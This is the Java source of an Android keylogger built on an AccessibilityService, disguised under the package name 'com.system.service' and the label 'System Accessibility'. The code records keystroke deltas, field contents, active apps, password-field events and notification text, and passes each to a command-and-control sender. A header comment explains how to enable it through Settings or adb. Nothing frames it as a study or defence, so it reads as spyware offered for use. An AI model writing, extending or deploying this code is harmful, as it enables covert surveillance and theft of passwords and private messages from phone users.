package com.system.service;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

/**
 * Accessibility-based keylogger + screen reader.
 * Captures:
 *   - Every character typed in any input field (TYPE_VIEW_TEXT_CHANGED)
 *   - Window focus changes — knows which app is active
 *   - Clipboard paste events
 *   - On-screen passwords (TYPE_VIEW_TEXT_SELECTION_CHANGED on password fields)
 *
 * Activation:
 *   Settings → Accessibility → Downloaded apps → "System Accessibility" → enable
 *   OR: adb shell settings put secure enabled_accessibility_services \
 *           com.system.service/.KeyloggerService
 */
public class KeyloggerService extends AccessibilityService {

    private String last_package = "";
    private String last_text    = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        int    type    = event.getEventType();
        String pkg     = event.getPackageName() != null
                         ? event.getPackageName().toString() : "";

        switch (type) {

            // ── Window switched — track active app ──
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
                if (!pkg.equals(last_package)) {
                    last_package = pkg;
                    C2Sender.send("[FOCUS] app=" + pkg);
                }
                break;
            }

            // ── Text typed in any field ──
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                CharSequence text = event.getText().isEmpty()
                        ? null : event.getText().get(0);
                if (text == null) break;
                String current = text.toString();

                // Send delta (new character) not full field every time
                if (current.startsWith(last_text) && current.length() > last_text.length()) {
                    String delta = current.substring(last_text.length());
                    C2Sender.send("[KEY] pkg=" + pkg + " delta=" + delta);
                } else {
                    // Field was cleared or changed entirely
                    C2Sender.send("[KEY] pkg=" + pkg + " full=" + current);
                }
                last_text = current;
                break;
            }

            // ── Field gained focus — dump current content ──
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                last_text = "";
                List<CharSequence> texts = event.getText();
                if (texts != null && !texts.isEmpty()) {
                    C2Sender.send("[FIELD_FOCUS] pkg=" + pkg
                            + " content=" + texts.get(0));
                }
                break;
            }

            // ── Clipboard paste ──
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED: {
                AccessibilityNodeInfo node = event.getSource();
                if (node != null && node.isPassword()) {
                    // Password field — dump what's visible
                    CharSequence t = node.getText();
                    if (t != null) {
                        C2Sender.send("[PASS_FIELD] pkg=" + pkg + " len=" + t.length());
                    }
                }
                break;
            }

            // ── Notification read (double capture with NotifListener) ──
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
                List<CharSequence> texts = event.getText();
                if (texts != null && !texts.isEmpty()) {
                    C2Sender.send("[NOTIF_A11Y] pkg=" + pkg
                            + " text=" + texts.get(0));
                }
                break;
            }
        }
    }

    @Override
    public void onInterrupt() {}
}
